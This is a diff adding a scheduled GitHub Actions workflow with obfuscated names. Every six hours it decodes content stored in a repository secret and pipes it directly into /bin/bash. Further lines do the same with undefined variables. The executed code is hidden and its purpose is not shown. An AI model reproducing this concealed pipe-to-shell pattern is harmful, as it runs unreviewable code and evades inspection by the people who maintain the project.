@@ -1,0 +1,24 @@
+name: kuanlvlihong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kuanlvlihong
+        env:
+          qyce199: ${{ secrets.qyce199 }}
+        run: |
+          echo $qyce199 | jq -r .iyyuo3 | /bin/bash
+          echo $s17 | jq -r .avryc2542 | /bin/bash
+          echo $gsnc9 | jq -r .gtfmu798 | /bin/bash
+          echo $gb7940 | jq -r .klqf93078 | /bin/bash
+          echo $rduo41 | jq -r .lfw68 | /bin/bash
+          echo $eswf1767 | jq -r .e5282 | /bin/bash
+          echo $q82 | jq -r .vvt08625 | /bin/bash
+          echo $qbheu5 | jq -r .npo5 | /bin/bash
+
